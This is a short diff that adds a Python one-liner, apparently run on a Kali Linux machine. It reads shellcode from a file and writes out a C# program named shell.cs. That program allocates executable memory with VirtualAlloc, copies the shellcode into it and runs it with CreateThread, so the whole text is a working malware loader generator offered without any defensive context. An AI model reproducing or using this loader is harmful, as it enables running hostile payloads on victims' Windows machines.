@@ -1,0 +1,18 @@
+python3 -c "
+buf = open('/home/kali/Downloads/bak.txt').read().strip()
+cs = '''using System;
+using System.Runtime.InteropServices;
+class P {{
+    [DllImport(\"kernel32.dll\")] static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
+    [DllImport(\"kernel32.dll\")] static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);
+    [DllImport(\"kernel32.dll\")] static extern uint WaitForSingleObject(IntPtr h,uint d);
+    static void Main(){{
+        {buf}
+        IntPtr m=VirtualAlloc(IntPtr.Zero,(uint)buf.Length,0x3000,0x40);
+        System.Runtime.InteropServices.Marshal.Copy(buf,0,m,buf.Length);
+        WaitForSingleObject(CreateThread(IntPtr.Zero,0,m,IntPtr.Zero,0,IntPtr.Zero),0xFFFFFFFF);
+    }}
+}}'''.format(buf=buf)
+open('/home/kali/Downloads/shell.cs','w').write(cs)
+print('Done')
+"
